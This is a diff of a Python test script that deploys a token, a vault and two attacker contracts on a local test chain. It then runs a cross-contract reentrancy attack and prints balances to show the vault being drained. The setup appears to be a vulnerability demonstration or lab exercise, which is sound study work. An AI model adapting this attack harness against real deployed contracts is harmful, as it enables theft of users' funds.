@@ -12,24 +12,25 @@ def cross_contract_reentrancy_attack():
     attacker = default_chain.accounts[1]
     
     ccrt = ERC20.deploy("Test", "TST", 18, from_=victim)
-    # ccrt.mint(victim, 100* 10**18, from_=victim)
     sfContract = cross_contract_reentrancy.deploy(ccrt.address, from_=victim)
-    sfContract.deposit(from_=victim, value=10* 10**18)
- 
-    
-    atContract = attack_cross_contract_reentrancy.deploy(sfContract.address, ccrt.address, from_=attacker)
+    sfContract.deposit(from_=victim, value="10 ether")
+
+    atContract = attack_cross_contract_reentrancy.deploy(sfContract.address, ccrt.address, from_=attacker, value="1 ether")
     atContract2 = attack2_cross_contract_reentrancy.deploy(sfContract.address, ccrt.address, from_=attacker)
 
+
+
     atContract.setattacker2(atContract2.address, from_=attacker)
-    print("Vault balance: ", sfContract.balance)
+    print("Vault balance  : ", sfContract.balance)
+    print("Attacker balace: ", atContract.balance)
 
 
     print("----------Attack----------")
     # attacker attck with value = 1*10**18
 
-    atContract.attack(from_=attacker, value=1*10**18)
+    atContract.attack(from_=attacker, )
 
-    print("Vault balance: ", sfContract.balance)
+    print("Vault balance   : ", sfContract.balance)
     print("Attacker balance: ", atContract.balance)
 
 
